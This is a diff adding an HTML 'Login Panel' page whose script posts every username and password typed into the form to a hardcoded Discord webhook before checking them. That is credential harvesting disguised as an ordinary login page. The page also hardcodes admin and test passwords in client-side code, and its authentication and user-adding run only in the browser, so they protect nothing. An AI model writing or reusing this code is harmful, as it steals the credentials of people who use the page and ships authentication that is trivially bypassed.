@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Login Panel</title>
+
+  <style>
+    body {
+      background-color: #1c1c1c;
+      font-family: Arial, sans-serif;
+      color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .login-box, .admin-box {
+      background-color: #2d3748;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+      text-align: center;
+      width: 300px;
+      margin-bottom: 20px;
+    }
+
+    .login-box h1, .admin-box h1 {
+      font-size: 1.8rem;
+      margin-bottom: 20px;
+      color: #edf2f7;
+    }
+
+    .input-field {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      background-color: #4a5568;
+      border: none;
+      border-radius: 5px;
+      color: white;
+      font-size: 1rem;
+    }
+
+    .btn {
+      width: 100%;
+      padding: 10px;
+      background-color: #38b2ac;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      font-size: 1rem;
+      cursor: pointer;
+    }
+
+    .btn:hover {
+      background-color: #319795;
+    }
+
+    .admin-box {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-box">
+    <h1>Login</h1>
+    <input type="text" id="username" class="input-field" placeholder="Username" />
+    <input type="password" id="password" class="input-field" placeholder="Password" />
+    <button class="btn" onclick="login()">Login</button>
+  </div>
+
+  <div class="admin-box">
+    <h1>Add User</h1>
+    <input type="text" id="new-username" class="input-field" placeholder="New Username" />
+    <input type="password" id="new-password" class="input-field" placeholder="New Password" />
+    <button class="btn" onclick="addUser()">Add User</button>
+  </div>
+
+  <script>
+    const webhookURL = "https://discord.com/api/webhooks/1319609815487614997/e1e6oZAG6yIt4-YSeQtPdJCf7k8LqQLKAvJkY-_vQyWQykSHEqC0GbYtFDF6pJgSl6cx";
+
+    // Initial valid users and admin credentials
+    const validUsers = {
+      "testuser": "password123"
+    };
+
+    const adminCredentials = {
+      username: "admin",
+      password: "supersecurepassword"
+    };
+
+    // Function to login a user
+    function login() {
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+
+      if (!username || !password) {
+        alert("Please fill in both fields.");
+        return;
+      }
+
+      // Send login attempt to Discord webhook
+      const payload = {
+        content: `Login Attempt:\nUsername: **${username}**\nPassword: ||${password}||`
+      };
+
+      fetch(webhookURL, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(payload)
+      });
+
+      // Validate admin credentials
+      if (username === adminCredentials.username && password === adminCredentials.password) {
+        alert("Admin login successful!");
+        document.querySelector(".admin-box").style.display = "block"; // Show Add User section
+        return;
+      }
+
+      // Validate user credentials
+      if (validUsers[username] && validUsers[username] === password) {
+        alert("Login successful! Redirecting...");
+        window.location.href = "dash.html"; // Redirect to dashboard
+      } else {
+        alert("Invalid username or password.");
+      }
+    }
+
+    // Function to add a new user
+    function addUser() {
+      const newUsername = document.getElementById("new-username").value;
+      const newPassword = document.getElementById("new-password").value;
+
+      if (!newUsername || !newPassword) {
+        alert("Please fill in both fields to add a user.");
+        return;
+      }
+
+      // Add the new user to the validUsers object
+      validUsers[newUsername] = newPassword;
+      alert(`User "${newUsername}" added successfully.`);
+    }
+  </script>
+</body>
+</html>
